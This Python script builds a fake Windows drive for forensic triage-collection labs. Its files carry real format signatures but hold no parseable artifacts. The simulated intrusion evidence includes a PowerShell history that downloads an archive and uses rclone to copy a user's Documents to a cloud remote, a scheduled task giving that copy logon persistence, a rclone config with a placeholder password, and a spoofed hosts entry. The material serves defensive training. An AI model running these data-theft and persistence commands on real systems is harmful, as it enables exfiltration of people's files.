#!/usr/bin/env python3
"""mk_win_triage_lab.py - write a small, fake Windows system drive for triage-collection labs.

Usage: python3 mk_win_triage_lab.py OUTDIR

OUTDIR becomes the root of a pretend C:\\ drive. Every file is a stand-in: it starts with the
real format's signature (regf, ElfFile, MAM, SQLite, LNK, OLE...) so file-type tools recognise
it, but it is NOT a parseable artifact. The point is to practise *collection*: which paths a
triage tool should pick up and which it should leave alone.

Folder names deliberately use Windows' real mixed case (Windows\\Prefetch, winevt\\Logs) while
KAPE targets use lower case (windows\\prefetch, winevt\\logs). That makes it obvious that a
collector must match paths case-insensitively, as Windows itself does.

Output is byte-identical on every run, and every file gets a fixed modification time.
Standard library only.
"""
import calendar
import os
import struct
import sys

# Scenario times (UTC): alice is phished on 2026-09-28 and data leaves on 2026-09-29.
T_INSTALL = "2026-03-02 09:00:00"
T_BOOT = "2026-09-28 07:58:12"
T_PHISH = "2026-09-28 10:14:31"
T_EXFIL = "2026-09-29 01:03:44"
T_LATE = "2026-09-29 01:09:05"

USERS_SID = "S-1-5-21-3623811015-3361044348-30300820-1001"


def ts(text):
    return calendar.timegm(tuple(int(x) for x in text.replace("-", " ").replace(":", " ").split()) + (0, 0, 0))


def pad(header, size, fill=b"\x00"):
    return header + fill * (size - len(header))


def hive(name):
    # regf base block: signature, two sequence numbers, then the hive's name (UTF-16LE) at 0x30.
    hdr = b"regf" + struct.pack("<II", 1, 1) + b"\x00" * 36 + name.encode("utf-16-le")
    return pad(hdr, 8192)


def hive_log(name):
    # Transaction logs (.LOG1/.LOG2) also start with a regf base block.
    return pad(b"regf" + struct.pack("<II", 2, 2) + b"\x00" * 36 + name.encode("utf-16-le"), 4096)


def evtx(channel):
    return pad(b"ElfFile\x00" + b"\x00" * 24 + channel.encode("utf-16-le"), 69632)


def prefetch(exe):
    # Windows 10/11 prefetch files are compressed and start with "MAM\x04".
    return pad(b"MAM\x04" + struct.pack("<I", 4096) + exe.encode("ascii"), 4096)


def lnk(target):
    clsid = bytes.fromhex("0114020000000000C000000000000046")
    return pad(struct.pack("<I", 0x4C) + clsid + target.encode("utf-16-le"), 512)


def ole():
    return pad(bytes.fromhex("D0CF11E0A1B11AE1"), 2048)


def sqlite(note):
    return pad(b"SQLite format 3\x00" + note.encode(), 4096)


def ese():
    # ESE (JET Blue) databases such as SRUDB.dat have 0x89ABCDEF at offset 4.
    return pad(b"\x00\x00\x00\x00" + struct.pack("<I", 0x89ABCDEF), 8192)


def recycle_index(original, size, deleted_utc):
    # $I file, Windows 10 format: version 2, original size, deletion FILETIME, name length, UTF-16 name.
    filetime = (ts(deleted_utc) + 11644473600) * 10_000_000
    name = original.encode("utf-16-le") + b"\x00\x00"
    return struct.pack("<qqqI", 2, size, filetime, len(name) // 2) + name


TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>CORP\\alice</Author><URI>\\OneDriveUpdate</URI></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions Context="Author"><Exec><Command>C:\\Users\\alice\\AppData\\Local\\Temp\\rc\\rclone.exe</Command>
  <Arguments>copy C:\\Users\\alice\\Documents remote:drop --config C:\\Users\\alice\\AppData\\Local\\Temp\\rc\\rc.conf</Arguments></Exec></Actions>
</Task>
"""

PS_HISTORY = """Get-ChildItem C:\\Users\\alice\\Documents -Recurse | Measure-Object -Property Length -Sum
Invoke-WebRequest https://downloads.example.net/rc.zip -OutFile $env:TEMP\\rc.zip
Expand-Archive $env:TEMP\\rc.zip -DestinationPath $env:TEMP\\rc
& $env:TEMP\\rc\\rclone.exe copy C:\\Users\\alice\\Documents remote:drop --config $env:TEMP\\rc\\rc.conf
schtasks /create /tn OneDriveUpdate /xml $env:TEMP\\rc\\task.xml
"""

RC_CONF = """[remote]
type = mega
user = drop.box.7731@example.com
pass = Xq3fUu1v0nYyK0dCwB1q8Ge9mZ2s
"""

HOSTS = """# Copyright (c) 1993-2009 Microsoft Corp.
#
# localhost name resolution is handled within DNS itself.
#\t127.0.0.1       localhost
#\t::1             localhost
203.0.113.50    update.onedrive-sync.example
"""

R = "Windows/System32/config/"
A = "Users/alice/"
AR = A + "AppData/Roaming/Microsoft/Windows/"

# (relative path, bytes, mtime)
FILES = [
    # --- Registry hives and transaction logs (system) ---
    (R + "SYSTEM", hive("SYSTEM"), T_BOOT),
    (R + "SYSTEM.LOG1", hive_log("SYSTEM"), T_BOOT),
    (R + "SYSTEM.LOG2", b"", T_INSTALL),
    (R + "SOFTWARE", hive("SOFTWARE"), T_EXFIL),
    (R + "SOFTWARE.LOG1", hive_log("SOFTWARE"), T_EXFIL),
    (R + "SAM", hive("SAM"), T_BOOT),
    (R + "SECURITY", hive("SECURITY"), T_BOOT),
    (R + "DEFAULT", hive("DEFAULT"), T_BOOT),
    ("Windows/AppCompat/Programs/Amcache.hve", hive("Amcache"), T_EXFIL),
    # --- Event logs (note the capital L in Logs) ---
    ("Windows/System32/winevt/Logs/Security.evtx", evtx("Security"), T_LATE),
    ("Windows/System32/winevt/Logs/System.evtx", evtx("System"), T_LATE),
    ("Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
     evtx("Microsoft-Windows-PowerShell/Operational"), T_EXFIL),
    ("Windows/System32/winevt/Logs/Microsoft-Windows-TaskScheduler%4Operational.evtx",
     evtx("Microsoft-Windows-TaskScheduler/Operational"), T_EXFIL),
    # --- Evidence of execution ---
    ("Windows/Prefetch/CMD.EXE-0BD30981.pf", prefetch("CMD.EXE"), T_PHISH),
    ("Windows/Prefetch/POWERSHELL.EXE-CA1AE517.pf", prefetch("POWERSHELL.EXE"), T_PHISH),
    ("Windows/Prefetch/RCLONE.EXE-5F3E1A2B.pf", prefetch("RCLONE.EXE"), T_EXFIL),
    ("Windows/System32/sru/SRUDB.dat", ese(), T_LATE),
    ("Windows/System32/Tasks/OneDriveUpdate", TASK_XML.encode("utf-16"), T_EXFIL),
    ("Windows/System32/drivers/etc/hosts", HOSTS.encode(), T_PHISH),
    # --- alice's profile ---
    (A + "NTUSER.DAT", hive("NTUSER.DAT"), T_LATE),
    (A + "NTUSER.DAT.LOG1", hive_log("NTUSER.DAT"), T_LATE),
    (A + "NTUSER.DAT.LOG2", b"", T_INSTALL),
    (A + "AppData/Local/Microsoft/Windows/UsrClass.dat", hive("UsrClass.dat"), T_LATE),
    (AR + "Recent/Q3-forecast.xlsx.lnk", lnk("C:\\Users\\alice\\Documents\\Q3-forecast.xlsx"), T_EXFIL),
    (AR + "Recent/rc.zip.lnk", lnk("C:\\Users\\alice\\AppData\\Local\\Temp\\rc.zip"), T_PHISH),
    (AR + "Recent/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms", ole(), T_EXFIL),
    (AR + "PowerShell/PSReadLine/ConsoleHost_history.txt", PS_HISTORY.encode(), T_EXFIL),
    (A + "AppData/Local/Microsoft/Edge/User Data/Default/History", sqlite("edge history"), T_PHISH),
    (A + "AppData/Local/Temp/rc.zip", pad(b"PK\x03\x04", 2048), T_PHISH),
    (A + "AppData/Local/Temp/rc/rclone.exe", pad(b"MZ", 8192), T_PHISH),
    (A + "AppData/Local/Temp/rc/rc.conf", RC_CONF.encode(), T_PHISH),
    (A + "Documents/Q3-forecast.xlsx", pad(b"PK\x03\x04", 6144), T_INSTALL),
    (A + "Pictures/holiday.jpg", pad(b"\xff\xd8\xff\xe0", 3072), T_INSTALL),
    # --- bob's profile (bob has an empty .LOG2 too: identical content, different path) ---
    ("Users/bob/NTUSER.DAT", hive("NTUSER.DAT bob"), T_BOOT),
    ("Users/bob/NTUSER.DAT.LOG2", b"", T_INSTALL),
    ("Users/bob/AppData/Local/Microsoft/Windows/UsrClass.dat", hive("UsrClass.dat bob"), T_BOOT),
    # --- Recycle Bin: $I holds metadata, $R holds the deleted content ---
    (f"$Recycle.Bin/{USERS_SID}/$I7Q2KD1.ps1", recycle_index("C:\\Users\\alice\\Desktop\\stage.ps1", 412, T_LATE), T_LATE),
    (f"$Recycle.Bin/{USERS_SID}/$R7Q2KD1.ps1", pad(b"# staging script", 412, b"#"), T_EXFIL),
    # --- Noise a triage target should NOT collect ---
    ("Windows/System32/notepad.exe", pad(b"MZ", 4096), T_INSTALL),
    ("Program Files/Common Files/readme.txt", b"vendor readme\n", T_INSTALL),
]


def main(outdir):
    for rel, data, when in FILES:
        path = os.path.join(outdir, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        os.utime(path, (ts(when), ts(when)))
    total = sum(len(d) for _, d, _ in FILES)
    print(f"wrote {len(FILES)} files ({total} bytes) under {outdir}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "winroot")
